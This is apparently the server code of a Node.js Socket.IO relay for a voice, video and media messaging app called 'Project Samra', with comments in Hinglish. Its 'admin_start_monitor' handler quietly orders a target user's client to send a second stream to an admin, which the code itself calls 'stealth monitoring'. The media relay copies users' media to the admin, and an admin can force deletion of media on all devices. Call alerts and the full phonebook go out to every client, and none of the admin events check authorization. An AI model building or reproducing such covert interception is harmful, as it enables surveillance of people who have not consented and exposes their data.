const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();

// Render ko sleep hone se bachane ke liye Health Check route
app.get('/', (req, res) => {
    res.send('Project Samra Relay Server is Active & Secure!');
});

const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" }
});

// Active state memory (No Database - pure RAM sync)
const activeUsers = new Map(); // userId -> socketId
let masterPhonebook = new Set(); // Duniya bhar ki registered IDs ka synced pool
const activeCalls = new Map(); // roomId -> { caller, receiver, adminMonitoring, participants: [] }

io.on('connection', (socket) => {
    console.log('New device connected:', socket.id);

    // 1. User Registration & In-Built Phonebook Sync
    socket.on('register_or_join', (data) => {
        const { userId, localPhonebook } = data;
        if (!userId) return;

        socket.join(userId);
        activeUsers.set(userId, socket.id);

        // Agar server ki memory khali thi (restart ke baad), toh pehle user ki phonebook se rebuild kar lo
        if (localPhonebook && Array.isArray(localPhonebook)) {
            localPhonebook.forEach(id => masterPhonebook.add(id));
        }
        masterPhonebook.add(userId);

        console.log(`User Synced & Online: ${userId}`);

        // Sabhi ko updated master phonebook broadcast kar do
        io.emit('sync_phonebook', Array.from(masterPhonebook));
    });

    // 2. Audio/Video Call Initiation & Admin Ringing Alert
    socket.on('start_call', (data) => {
        const { callerId, receiverId, roomId } = data;
        
        activeCalls.set(roomId, {
            caller: callerId,
            receiver: receiverId,
            participants: [callerId, receiverId],
            monitoringAdmin: null
        });

        // Target user ko call bhejo
        socket.to(receiverId).emit('incoming_call', { callerId, roomId });

        // Admin C (`database` app) ko ringing notification bhejo
        io.emit('admin_ringing_alert', { callerId, receiverId, roomId, status: 'Ringing' });
        console.log(`Call started between ${callerId} and ${receiverId}. Admin alerted.`);
    });

    // 3. Call Connected (Admin Dashboard Update & Stop Ringing)
    socket.on('accept_call', (data) => {
        const { roomId } = data;
        io.to(roomId).emit('call_connected', { status: 'success' });
        io.emit('admin_call_active_update', { roomId, status: 'Connected' });
    });

    // 4. Stealth Dual-Stream Control (Admin C Monitoring)
    socket.on('admin_start_monitor', (data) => {
        const { targetUserId, adminId, roomId } = data;
        const callData = activeCalls.get(roomId);
        if (callData) callData.monitoringAdmin = adminId;

        // Target user ke software ko chupchap 2 copies bhejne ka command do
        const targetSocketId = activeUsers.get(targetUserId);
        if (targetSocketId) {
            io.to(targetSocketId).emit('enable_dual_stream', { adminId });
            console.log(`Stealth monitoring enabled for ${targetUserId} by Admin.`);
        }
    });

    socket.on('admin_stop_monitor', (data) => {
        const { targetUserId, roomId } = data;
        const callData = activeCalls.get(roomId);
        if (callData) callData.monitoringAdmin = null;

        const targetSocketId = activeUsers.get(targetUserId);
        if (targetSocketId) {
            io.to(targetSocketId).emit('disable_dual_stream');
            console.log(`Stealth monitoring stopped for ${targetUserId}. Reverting to 1 stream.`);
        }
    });

    // 5. Media Relay & Admin C Copy Rule
    socket.on('send_media', (data) => {
        const { recipientId, mediaPayload, adminId } = data;
        // Send to intended recipient
        socket.to(recipientId).emit('receive_media', mediaPayload);

        // Agar Admin C online hai, toh use bhi copy bhej do
        if (adminId && activeUsers.has(adminId)) {
            socket.to(activeUsers.get(adminId)).emit('admin_receive_media_copy', mediaPayload);
        }
    });

    // Admin C Delete Supremacy Command
    socket.on('admin_delete_media', (data) => {
        const { mediaId, targetUserId } = data;
        // Sabhi devices/users ko command do ki is media ko permanently wipe karein
        io.emit('force_delete_media', { mediaId });
        console.log(`Admin forced deletion for media ID: ${mediaId}`);
    });

    // 6. Kill-Switch & Disconnect Handling
    socket.on('disconnect', () => {
        let disconnectedUser = null;
        for (let [userId, sId] of activeUsers.entries()) {
            if (sId === socket.id) {
                disconnectedUser = userId;
                activeUsers.delete(userId);
                break;
            }
        }

        if (disconnectedUser) {
            console.log(`User Offline: ${disconnectedUser}`);
            
            // Kill-Switch Check: Agar yeh user kisi active call mein tha, toh sabki call cut kar do
            for (let [roomId, call] of activeCalls.entries()) {
                if (call.participants.includes(disconnectedUser)) {
                    io.to(roomId).emit('force_end_call', { reason: 'Peer disconnected or signal lost' });
                    activeCalls.delete(roomId);
                    console.log(`Kill-switch triggered for room ${roomId} due to disconnect.`);
                    break;
                }
            }
        }

        io.emit('sync_phonebook', Array.from(masterPhonebook));
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Project Samra Relay Server running on port ${PORT}`);
});